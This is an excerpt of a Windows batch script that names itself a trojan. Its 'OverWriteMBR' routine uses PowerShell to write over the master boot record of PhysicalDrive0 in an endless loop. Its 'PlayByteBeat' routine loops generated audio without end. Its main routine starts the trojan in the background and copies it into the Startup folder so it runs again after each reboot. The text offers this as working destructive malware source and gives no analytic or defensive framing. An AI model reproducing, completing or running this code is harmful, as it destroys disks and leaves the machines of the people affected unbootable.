...
:OverWriteMBR
   ...
   powershell -c "$data = [byte[]](!mbrData!); while ($true) { $fs = [System.IO.File]::Open('\\.\PhysicalDrive0', [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite); $fs.Write($data, 0, !mbrData.Length!); $fs.Close(); }" >nul
goto :eof
...
:PlayByteBeat
   ...
   set hz_rate=11025
   set duration=30
   powershell -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.IO; using System.Media; public class WinAPI { public static void PlaySequence() { int hz_rate = !hz_rate!; int duration = !duration!; int buffer = hz_rate * duration; byte[] b = new byte[buffer]; for (int t = 0; t < buffer; t++) b[t] = (byte)(!BBFRM!); using (var m = new MemoryStream()) { using (var w = new BinaryWriter(m)) { w.Write(new byte[] { 82, 73, 70, 70 }); w.Write(36 + b.Length); w.Write(new byte[] { 87, 65, 86, 69 }); w.Write(new byte[] { 102, 109, 116, 32 }); w.Write(16); w.Write((short)1); w.Write((short)1); w.Write(hz_rate); w.Write(hz_rate * 1); w.Write((short)1); w.Write((short)8); w.Write(new byte[] { 100, 97, 116, 97 }); w.Write(b.Length); w.Write(b); m.Position = 0; new SoundPlayer(m).PlaySync(); }}}}'; while ($true) { [WinAPI]::PlaySequence(); }"
goto :eof
...
:WinMain
   ...
   for /f "tokens=1,2 delims=#" %%x in ('"prompt #$H#$E# & echo on & for %%y in (1) do rem"') do (set ESC=%%y)
   ...
   if not exist "%temp%\Shingapi.Null.dll" (
      ...
      start /b "" cmd /c "%TROJAN_FILE_PATH%" -PlayByteBeat >nul 2>nul
   ...
   copy %TROJAN_SCRIPT% "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul 2>nul
